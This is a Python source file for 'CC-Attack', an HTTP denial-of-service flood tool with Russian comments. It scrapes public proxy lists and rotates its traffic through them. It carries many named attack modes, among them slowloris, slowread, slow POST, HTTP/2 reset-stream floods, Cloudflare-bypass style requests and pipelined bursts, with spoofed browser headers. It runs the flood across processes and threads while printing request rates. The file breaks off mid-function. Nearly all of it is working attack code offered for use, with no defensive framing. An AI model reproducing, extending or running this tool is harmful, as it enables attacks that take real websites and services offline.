#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
CC-Attack v5.3.1 — Mega+ Edition (fixed KeyError target)
Author: DIDO
Requires: pip install requests pysocks
"""
import argparse
import concurrent.futures as cf
import datetime
import json
import logging
import multiprocessing as mp
import os
import platform
import queue
import random
import re
import signal
import socket
import ssl
import struct
import sys
import threading
import time
from pathlib import Path

try:
    import ctypes
except ImportError:
    ctypes = None

import requests
import socks

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI / цветовая палитра (+ Windows fix)
# ─────────────────────────────────────────────────────────────────────────────
def _enable_ansi_windows() -> bool:
    if os.name != "nt":
        return True
    if ctypes is None:
        return False
    for stream_id in (-11, -12):
        try:
            handle = ctypes.windll.kernel32.GetStdHandle(stream_id)
            mode = ctypes.c_uint32()
            if not ctypes.windll.kernel32.GetConsoleMode(
                handle, ctypes.byref(mode)
            ):
                return False
            new_mode = mode.value | 0x0004
            if not ctypes.windll.kernel32.SetConsoleMode(handle, new_mode):
                return False
        except Exception:
            return False
    return True


ANSI_OK = _enable_ansi_windows()


class C:
    if ANSI_OK:
        RESET = "\033[0m"; BOLD = "\033[1m"; DIM  = "\033[2m"
        RED   = "\033[91m"; ORG  = "\033[38;5;208m"
        YEL   = "\033[93m"; GRN  = "\033[92m"
        CYN   = "\033[96m"; BLU  = "\033[94m"
        PRP   = "\033[95m"; WHT  = "\033[97m"
    else:
        RESET = BOLD = DIM = RED = ORG = ""
        YEL = GRN = CYN = BLU = PRP = WHT = ""


VERSION = "5.3.1"
BUILD   = "2026/09/27"

# ── Автодетект Termux ───────────────────────────────────────────────────────
def _is_termux() -> bool:
    if "ANDROID_ROOT" in os.environ or "ANDROID_DATA" in os.environ:
        return True
    if "com.termux" in os.environ.get("PREFIX", ""):
        return True
    if "termux" in platform.platform().lower():
        return True
    if os.path.exists("/data/data/com.termux"):
        return True
    return False


IS_TERMUX = _is_termux()

# ── HP tuning ───────────────────────────────────────────────────────────────
PIPELINE_DEPTH        = 64
KEEPALIVE_PER_SOCKET  = 10000
SOCKET_SNDBUF         = 4194304
SOCKET_RCVBUF         = 4194304
CONNECT_TIMEOUT       = 2.5
SEND_TIMEOUT          = 2.0
ERROR_BACKOFF         = 0.001
SEND_CHUNK            = 65536

TOP_ALIVE_DEFAULT     = 2000

# ── Методы ──────────────────────────────────────────────────────────────────
HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE",
    "PATCH", "OPTIONS", "TRACE", "CONNECT",
]
SPECIAL_METHODS = [
    "OVH", "RAPIDREST",
    "CFB", "SLOWPOST", "BURST", "HTTP3",
    "GOD", "POWER", "NUCLEAR", "LASER", "SHOTGUN", "STEALTH",
]
ALL_METHODS = HTTP_METHODS + SPECIAL_METHODS + ["RANDOM"]

# ── Техники ─────────────────────────────────────────────────────────────────
TECHNIQUES = [
    "flood", "slow", "pipeline", "mixed", "random",
    "slowloris", "gzip", "chunked", "range", "http2",
    "websocket", "prewarm",
    "turbo", "bypass", "carpet", "slowread",
]

# ── Fast RNG ────────────────────────────────────────────────────────────────
class FastRNG:
    __slots__ = ("_pool", "_idx", "_size")

    def __init__(self, size: int = 8192):
        self._size = size
        self._pool = [random.randint(0, 271400281257) for _ in range(size)]
        self._idx = 0

    def next(self) -> int:
        i = self._idx
        self._idx = (i + 1) & (self._size - 1)
        return self._pool[i]


# ── Async logger ────────────────────────────────────────────────────────────
class AsyncLog:
    _queue: "queue.Queue[str]" = queue.Queue(maxsize=100000)
    _thread: threading.Thread | None = None
    _stop = threading.Event()
    _enabled: bool = True

    @classmethod
    def start(cls):
        if not cls._enabled:
            return
        if cls._thread is None:
            cls._thread = threading.Thread(target=cls._writer, daemon=True)
            cls._thread.start()

    @classmethod
    def shutdown(cls):
        """Останавливает логгер перед выходом, чтобы не было блокировки stdout."""
        cls._stop.set()
        if cls._thread is not None:
            try:
                cls._thread.join(timeout=1.0)
            except Exception:
                pass

    @classmethod
    def _writer(cls):
        q = cls._queue
        while not cls._stop.is_set():
            try:
                msg = q.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                sys.stdout.write(msg)
                sys.stdout.flush()
            except Exception:
                pass

    @classmethod
    def put(cls, msg: str):
        if not cls._enabled:
            try:
                sys.stdout.write(msg)
                sys.stdout.flush()
            except Exception:
                pass
            return
        try:
            cls._queue.put_nowait(msg)
        except queue.Full:
            pass


AsyncLog.start()


class Log:
    _lock = threading.Lock()

    @staticmethod
    def _emit(prefix: str, color: str, msg: str) -> None:
        with Log._lock:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            AsyncLog.put(f"{C.DIM}[{ts}]{C.RESET} {color}{prefix}{C.RESET} {msg}\n")

    @staticmethod
    def info(m): Log._emit("[*]", C.RED, m)
    @staticmethod
    def ok(m):   Log._emit("[+]", C.GRN, m)
    @staticmethod
    def warn(m): Log._emit("[!]", C.YEL, m)
    @staticmethod
    def err(m):  Log._emit("[-]", C.RED, m)


# ─────────────────────────────────────────────────────────────────────────────
#  БАННЕР
# ─────────────────────────────────────────────────────────────────────────────
def print_banner() -> None:
    mode = "THREAD-MODE" if IS_TERMUX else "MULTIPROCESSING"
    print(f"""
{C.RED}  ██████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
 ██║     ██║         ███████║   ██║      ██║   ███████║██║     █████╔╝
 ██║     ██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
 ╚██████╗╚██████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
  ╚═════╝ ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{C.RESET}
                    {C.YEL}v{VERSION} MEGA+ EDITION{C.RESET}  •  {C.CYN}{BUILD}{C.RESET}  •  by {C.BOLD}DIDO{C.RESET}

{C.DIM}Python {platform.python_version()}  |  {platform.system()} {platform.release()}  |  CPU: {platform.machine()} ({mp.cpu_count()} ядер){C.RESET}
{C.DIM}Mode: {mode}{C.RESET}
""")


# ─────────────────────────────────────────────────────────────────────────────
#  ИСТОЧНИКИ ПРОКСИ 2026
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PROXY_SOURCES = {
    "socks4": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks4/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks4.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks4.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks4.txt",
    ],
    "socks5": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks5.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/socks5.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/socks5.txt",
    ],
    "http": [
        "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
        "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
        "https://raw.githubusercontent.com/LoneKingCode/free-proxy-db/main/proxies/http.txt",
        "https://raw.githubusercontent.com/dinoz0rg/proxy-list/main/scraped_proxies/http.txt",
        "https://raw.githubusercontent.com/theriturajps/proxy-list/main/proxies.txt",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
#  UA / HEADERS
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_VERSIONS = [f"{v}.0.0.0" for v in range(120, 137)]
_OS_WINDOWS = ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"]
_OS_MAC = ["Macintosh; Intel Mac OS X 10_15_7",
           "Macintosh; Intel Mac OS X 14_6_1"]
_OS_LINUX = ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"]

ACCEPT_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: application/json, text/plain, */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

SEC_FETCH_HEADERS = [
    "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n",
    "Sec-Fetch-Dest: empty\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Site: same-origin\r\n",
    "Sec-Fetch-Dest: script\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: cross-site\r\n",
    "Sec-Fetch-Dest: image\r\nSec-Fetch-Mode: no-cors\r\nSec-Fetch-Site: same-origin\r\n",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.google.ru/search?q=",
    "https://yandex.ru/search/?text=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://vk.com/search?c[q]=",
    "https://ok.ru/search?st.query=",
]

_UA_CACHE: list[str] = []
_UA_CACHE_LOCK = threading.Lock()


def get_ua() -> str:
    if not _UA_CACHE:
        with _UA_CACHE_LOCK:
            if not _UA_CACHE:
                for _ in range(256):
                    os_str = random.choice(_OS_WINDOWS + _OS_MAC + _OS_LINUX)
                    wv = random.randint(537, 605)
                    cv = random.choice(_CHROME_VERSIONS)
                    _UA_CACHE.append(
                        f"Mozilla/5.0 ({os_str}) AppleWebKit/{wv}.36 "
                        f"(KHTML, like Gecko) Chrome/{cv} Safari/{wv}.36"
                    )
    return random.choice(_UA_CACHE)


# ─────────────────────────────────────────────────────────────────────────────
#  ЯДРО АТАКИ
# ─────────────────────────────────────────────────────────────────────────────
class CCHandler:
    def __init__(self, target, path, port, protocol, proxies, proxy_type,
                 cookies, post_data, brute, stop_event,
                 method="GET", technique="flood", slow_delay=0.5,
                 pipeline_depth=PIPELINE_DEPTH,
                 keepalive=KEEPALIVE_PER_SOCKET):

        self.target = target
        self.path = path
        self.port = port
        self.protocol = protocol
        self.proxies = proxies
        self.proxy_type = proxy_type
        self.cookies = cookies
        self.post_data = post_data
        self.brute = brute
        self.stop = stop_event
        self.pipeline_depth = max(1, min(128, pipeline_depth))
        self.keepalive = max(1, min(100000, keepalive))
        self.method = "RANDOM" if method == "RANDOM" else method.upper()
        self.technique = technique.lower()
        self.slow_delay = max(0.0, slow_delay)

        self.rng = FastRNG(size=8192)
        self.ua_cache = [get_ua() for _ in range(64)]

        self.stats_sent = 0
        self.stats_errors = 0
        self.stats_bytes = 0

        self._rr = random.randint(0, max(0, len(proxies) - 1))
        self._rr_lock = threading.Lock()

        self._sep = "&" if "?" in self.path else "?"

    def _stat(self, sent=0, err=0, nbytes=0):
        self.stats_sent += sent
        self.stats_errors += err
        self.stats_bytes += nbytes

    def _pick_proxy(self):
        n = len(self.proxies)
        for _ in range(min(20, n)):
            with self._rr_lock:
                self._rr = (self._rr + 1) % n
                p = self.proxies[self._rr]
            host, _, port_s = p.rpartition(":")
            if not port_s:
                continue
            try:
                port = int(port_s)
            except ValueError:
                continue
            if 0 < port < 65536 and host:
                return host, port
        raise ValueError("no valid proxy")

    def _resolve_method(self):
        if self.method == "RANDOM":
            return random.choice(ALL_METHODS[:-1])
        return self.method

    # ═══ БАЗОВЫЕ МЕТОДЫ ═══════════════════════════════════════════════
    def _build_basic(self, method: str) -> bytes:
        m = method.upper()
        conn = "Connection: Keep-Alive\r\n"
        if self.cookies:
            conn += f"Cookie: {self.cookies}\r\n"
        ref = f"Referer: {random.choice(REFERERS)}{self.target}{self.path}\r\n"
        ua = f"User-Agent: {get_ua()}\r\n"
        acc = random.choice(ACCEPT_HEADERS)

        if m in ("GET", "HEAD", "OPTIONS", "TRACE", "CONNECT"):
            return (ref + ua + acc + conn + "\r\n").encode()

        body = self.post_data or os.urandom(16).hex()
        ctype = "Content-Type: application/x-www-form-urlencoded\r\n"
        extra = "X-Requested-With: XMLHttpRequest\r\n" if m == "POST" else ""

        if self.technique == "gzip":
            import zlib
            extra += "Content-Encoding: gzip\r\n"
            body = zlib.compress(body.encode("utf-8")).decode("latin-1")
        elif self.technique == "chunked":
            extra += "Transfer-Encoding: chunked\r\n"
            ctype = ""
            chunks = []
            for i in range(0, len(body), 8):
                part = body[i:i + 8]
                chunks.append(f"{len(part):x}\r\n{part}\r\n")
            chunks.append("0\r\n\r\n")
            body = "".join(chunks)
        if self.technique == "range":
            extra += "Range: bytes=0-1\r\n"

        length_line = ""
        if "Transfer-Encoding" not in extra:
            length_line = f"Content-Length: {len(body)}\r\n"

        return (
            f"{m} {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"{acc}{ctype}{extra}{ref}{ua}"
            f"{length_line}{conn}"
            f"\r\n{body}\r\n\r\n"
        ).encode()

    # ═══ OVH ══════════════════════════════════════════════════════════
    def _build_ovh(self) -> bytes:
        ua = get_ua()
        return (
            f"GET {self.path}{self._sep}{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: identity\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

    # ═══ RAPIDREST ════════════════════════════════════════════════════
    def _build_rapidrest(self) -> bytes:
        body = os.urandom(32)
        return (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: identity\r\n"
            f"Cache-Control: no-store\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode() + body

    # ═══ CFB ══════════════════════════════════════════════════════════
    def _build_cfb(self) -> bytes:
        ua = get_ua()
        sec = random.choice(SEC_FETCH_HEADERS)
        return (
            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"{sec}"
            f"Connection: Keep-Alive\r\n\r\n"
        ).encode()

    # ═══ SLOWPOST ═════════════════════════════════════════════════════
    def _build_slowpost(self) -> bytes:
        body = "A" * 1024
        headers = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {get_ua()}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        )
        return (headers + body).encode()

    # ═══ BURST ════════════════════════════════════════════════════════
    def _build_burst(self) -> bytes:
        ua = get_ua()
        rng = self.rng
        parts = []
        for _ in range(32):
            parts.append(
                f"GET {self.path}?{rng.next()} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"UA: {ua[:20]}\r\n"
                f"Connection: Keep-Alive\r\n\r\n"
            )
        return "".join(parts).encode()

    # ═══ HTTP3 ════════════════════════════════════════════════════════
    def _build_http3(self) -> bytes:
        ua = get_ua()
        return (
            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Alt-Used: {self.target}\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        ).encode()

    # ═══ GOD ══════════════════════════════════════════════════════════
    def _build_god(self) -> bytes:
        rng = self.rng
        parts = []
        target = self.target
        path = self.path
        for _ in range(20):
            parts.append(
                f"GET {path}?{rng.next()} HTTP/1.1\r\n"
                f"Host: {target}\r\n\r\n"
            )
        return "".join(parts).encode()

    # ═══ POWER ════════════════════════════════════════════════════════
    def _build_power(self) -> bytes:
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
        parts = [preface, settings]
        for stream_id in range(1, 100, 2):
            rst = (struct.pack(">BHB", 0, 4, 0x03) +
                   struct.pack(">I", stream_id) +
                   struct.pack(">I", 0x08))
            parts.append(rst)
        return b"".join(parts)

    # ═══ NUCLEAR ══════════════════════════════════════════════════════
    def _build_nuclear(self) -> bytes:
        chunk_size = 8192
        total_chunks = 12
        parts = [
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {get_ua()}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        ]
        for _ in range(total_chunks):
            chunk = os.urandom(chunk_size)
            parts.append(f"{chunk_size:x}\r\n")
            parts.append(chunk.decode("latin-1"))
            parts.append("\r\n")
        parts.append("0\r\n\r\n")
        return "".join(parts).encode("latin-1")

    # ═══ LASER ════════════════════════════════════════════════════════
    def _build_laser(self) -> bytes:
        rng = self.rng
        return (
            f"GET /{rng.next() % 9999} HTTP/1.1\r\n"
            f"Host:{self.target}\r\n\r\n"
        ).encode()

    # ═══ SHOTGUN ══════════════════════════════════════════════════════
    def _build_shotgun(self) -> bytes:
        rng = self.rng
        t = self.target
        p = self.path
        ua = get_ua()[:20]
        parts = [
            f"GET {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
            f"HEAD {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
            f"OPTIONS * HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
            f"PUT {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\nContent-Length: 4\r\n\r\nAAAA",
            f"DELETE {p}?{rng.next()} HTTP/1.1\r\nHost:{t}\r\nUA:{ua}\r\n\r\n",
        ]
        return "".join(parts).encode()

    # ═══ STEALTH ══════════════════════════════════════════════════════
    def _build_stealth(self) -> bytes:
        ua = get_ua()
        sec = random.choice(SEC_FETCH_HEADERS)
        ref = f"https://{self.target}/"
        return (
            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: max-age=0\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Accept-Language: en-US,en;q=0.9,ru;q=0.8\r\n"
            f"{sec}"
            f"Referer: {ref}\r\n\r\n"
        ).encode()

    # ═══ HTTP/2 ═══════════════════════════════════════════════════════
    def _build_http2_upgrade(self) -> bytes:
        ua = get_ua()
        return (
            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n"
        ).encode()

    def _build_http2_pk(self) -> bytes:
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
        rst = struct.pack(">BHB", 0, 4, 0x03) + struct.pack(">I", 1) + struct.pack(">I", 0x08)
        return preface + settings + rst

    # ═══ WebSocket ════════════════════════════════════════════════════
    def _build_websocket(self) -> bytes:
        key = os.urandom(16).hex()
        ua = get_ua()
        return (
            f"GET {self.path}?{random.randint(0, 271400281257)} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        ).encode()

    # ═══ ОДИН ЗАПРОС ══════════════════════════════════════════════════
    def _build_one(self) -> bytes:
        m = self._resolve_method()
        tech = self.technique

        if m == "OVH": return self._build_ovh()
        if m == "RAPIDREST": return self._build_rapidrest()
        if m == "CFB": return self._build_cfb()
        if m == "SLOWPOST": return self._build_slowpost()
        if m == "BURST": return self._build_burst()
        if m == "HTTP3": return self._build_http3()
        if m == "GOD": return self._build_god()
        if m == "POWER": return self._build_power()
        if m == "NUCLEAR": return self._build_nuclear()
        if m == "LASER": return self._build_laser()
        if m == "SHOTGUN": return self._build_shotgun()
        if m == "STEALTH": return self._build_stealth()

        if tech == "http2":
            if random.random() < 0.5: return self._build_http2_pk()
            return self._build_http2_upgrade()
        if tech == "websocket": return self._build_websocket()
        if tech == "carpet":
            choice = random.random()
            if choice < 0.4: return self._build_basic("GET")
            elif choice < 0.7: return self._build_http2_upgrade()
            else: return self._build_websocket()
        if tech == "bypass":
            m2 = random.choice(ALL_METHODS[:-1])
            if m2 in ("OVH", "CFB", "HTTP3"): return self._build_cfb()
            if m2 == "SLOWPOST": return self._build_slowpost()
            if m2 == "BURST": return self._build_burst()
            if m2 == "RAPIDREST": return self._build_rapidrest()
            if m2 == "GOD": return self._build_god()
            if m2 == "POWER": return self._build_power()
            if m2 == "NUCLEAR": return self._build_nuclear()
            if m2 == "LASER": return self._build_laser()
            if m2 == "SHOTGUN": return self._build_shotgun()
            if m2 == "STEALTH": return self._build_stealth()
            return self._build_basic(m2)

        return self._build_basic(m)

    def _build_batch(self, n: int) -> bytes:
        parts = []
        for _ in range(n):
            parts.append(self._build_one())
        return b"".join(parts)

    def _send_batch(self, s, batch: bytes) -> bool:
        try:
            CHUNK = SEND_CHUNK
            n = len(batch)
            if n <= CHUNK:
                s.sendall(batch)
            else:
                for i in range(0, n, CHUNK):
                    s.sendall(batch[i:i + CHUNK])
            return True
        except (socket.timeout, BrokenPipeError,
                ConnectionResetError, OSError):
            return False

    def _attack_pipeline(self, s):
        depth = self.pipeline_depth
        ka = self.keepalive
        sent = 0
        while sent < ka and not self.stop.is_set():
            batch = self._build_batch(depth)
            if not self._send_batch(s, batch):
                return
            sent += depth
            self._stat(sent=depth, nbytes=len(batch))

    def _attack_single(self, s):
        req = self._build_one()
        try:
            s.sendall(req)
            self._stat(sent=1, nbytes=len(req))
        except Exception:
            pass

    def _attack_slow(self, s):
        req = self._build_one()
        try:
            for byte in req:
                if self.stop.is_set():
                    return
                s.sendall(bytes([byte]))
                if self.slow_delay > 0:
                    time.sleep(self.slow_delay)
            self._stat(sent=1, nbytes=len(req))
        except Exception:
            pass

    def _attack_slowread(self, s):
        req = self._build_basic("GET")
        try:
            s.sendall(req)
            self._stat(sent=1, nbytes=len(req))
            s.settimeout(10)
            for _ in range(100):
                if self.stop.is_set():
                    return
                try:
                    data = s.recv(1)
                    if not data:
                        break
                except socket.timeout:
                    break
        except Exception:
            pass

    def _attack_turbo(self, s):
        depth = 128
        ka = self.keepalive
        sent = 0
        while sent < ka and not self.stop.is_set():
            batch = self._build_batch(depth)
            try:
                s.sendall(batch)
            except (socket.timeout, BrokenPipeError,
                    ConnectionResetError, OSError):
                return
            sent += depth
            self._stat(sent=depth, nbytes=len(batch))

    def _open(self, host, port):
        s = socks.socksocket()

        if self.proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, port)
        elif self.proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, port)
        else:
            s.set_proxy(socks.HTTP, host, port)

        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_SNDBUF)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCKET_RCVBUF)
            if hasattr(socket, "TCP_QUICKACK"):
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
                except OSError:
                    pass
        except OSError:
            pass

        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.target, self.port))

        if self.protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.target)

        try:
            s.settimeout(SEND_TIMEOUT)
        except OSError:
            pass
        return s

    def run(self):
        stop = self.stop
        while not stop.is_set():
            try:
                host, port = self._pick_proxy()
            except ValueError:
                time.sleep(ERROR_BACKOFF * 10)
                continue

            s = None
            try:
                s = self._open(host, port)

                tech = self.technique
                if tech == "random":
                    tech = random.choice(TECHNIQUES)
                elif tech == "mixed":
                    tech = random.choice(["flood", "pipeline", "gzip",
                                          "chunked", "range",
                                          "http2", "websocket"])

                if tech == "turbo":
                    self._attack_turbo(s)
                elif tech == "slowread":
                    self._attack_slowread(s)
                elif tech in ("bypass", "carpet"):
                    self._attack_pipeline(s)
                elif tech == "slow":
                    self._attack_slow(s)
                elif tech in ("flood", "pipeline", "gzip", "chunked",
                              "range", "http2", "websocket",
                              "prewarm", "slowloris"):
                    self._attack_pipeline(s)
                else:
                    self._attack_single(s)

                try:
                    s.close()
                except Exception:
                    pass
            except Exception:
                self._stat(err=1)
                if s is not None:
                    try: s.close()
                    except Exception: pass
                time.sleep(ERROR_BACKOFF)


# ─────────────────────────────────────────────────────────────────────────────
#  WORKER: multiprocessing (Linux/Win) ИЛИ threading (Termux)
# ─────────────────────────────────────────────────────────────────────────────
def _run_multiprocessing(cfg, proxies, proc_cfg, cpu_count):
    result_q = mp.Queue()
    stop_flag = mp.Value("b", 0)

    processes = []
    for _ in range(cpu_count):
        p = mp.Process(
            target=_proc_worker,
            args=(proc_cfg, proxies, cfg["threads"], cfg["period"],
                  result_q, stop_flag),
            daemon=False,
        )
        p.start()
        processes.append(p)

    start = time.time()
    sent_total = errors_total = bytes_total = 0
    last_sent = 0
    last_time = start

    try:
        while time.time() - start < cfg["period"]:
            time.sleep(1)
            elapsed = max(1e-6, time.time() - start)

            while True:
                try:
                    ds, de, db, ts, te, tb = result_q.get_nowait()
                    sent_total += ds
                    errors_total += de
                    bytes_total += db
                except queue.Empty:
                    break

            now = time.time()
            dt = now - last_time
            inst_rps = (sent_total - last_sent) / dt if dt > 0 else 0
            last_sent = sent_total
            last_time = now

            sys.stdout.write(
                f"\r  {C.GRN}▶{C.RESET} {int(elapsed):>3}/{cfg['period']}s  "
                f"| {C.CYN}RPS:{C.RESET} {inst_rps:>10.0f}  "
                f"| {C.RED}errs:{C.RESET} {errors_total:<7}  "
                f"| {C.YEL}MB:{C.RESET} {bytes_total / 1048576:>7.2f}"
            )
            sys.stdout.flush()
    except KeyboardInterrupt:
        Log.warn("Interrupt — stopping…")
    finally:
        stop_flag.value = 1
        deadline = time.time() + 2.0
        for p in processes:
            remain = max(0.1, deadline - time.time())
            p.join(timeout=remain)
        for p in processes:
            if p.is_alive():
                p.terminate()
        for p in processes:
            if p.is_alive():
                p.join(timeout=1)
        print()

        while True:
            try:
                ds, de, db, ts, te, tb = result_q.get_nowait()
                sent_total += ds
                errors_total += de
                bytes_total += db
            except queue.Empty:
                break

        total_time = max(1e-6, time.time() - start)
        Log.ok(f"Done. Sent: {sent_total}, errors: {errors_total}, "
               f"traffic: {bytes_total / 1048576:.2f} MB, "
               f"avg RPS: {sent_total / total_time:.0f}")
    return 0


def _proc_worker(cfg, proxies, thread_count, period, result_q, stop_flag):
    stop_event = threading.Event()

    handler = CCHandler(
        target=cfg["target"], path=cfg["path"],
        port=cfg["port"], protocol=cfg["protocol"],
        proxies=proxies, proxy_type=cfg["proxy_type"],
        cookies=cfg.get("cookies", ""),
        post_data=cfg.get("post_data", ""),
        brute=cfg.get("brute", False),
        stop_event=stop_event,
        method=cfg.get("method", "GET"),
        technique=cfg.get("technique", "flood"),
        pipeline_depth=cfg["pipeline"],
        keepalive=cfg["keepalive"],
    )

    for _ in range(thread_count):
        t = threading.Thread(target=handler.run, daemon=True)
        t.start()

    stop_reporter = threading.Event()

    def reporter():
        last_sent = last_err = last_bytes = 0
        while not stop_reporter.is_set():
            time.sleep(1.0)
            cs = handler.stats_sent
            ce = handler.stats_errors
            cb = handler.stats_bytes
            try:
                result_q.put_nowait(
                    (cs - last_sent, ce - last_err, cb - last_bytes,
                     cs, ce, cb))
            except Exception:
                pass
            last_sent, last_err, last_bytes = cs, ce, cb

    threading.Thread(target=reporter, daemon=True).start()

    start = time.time()
    try:
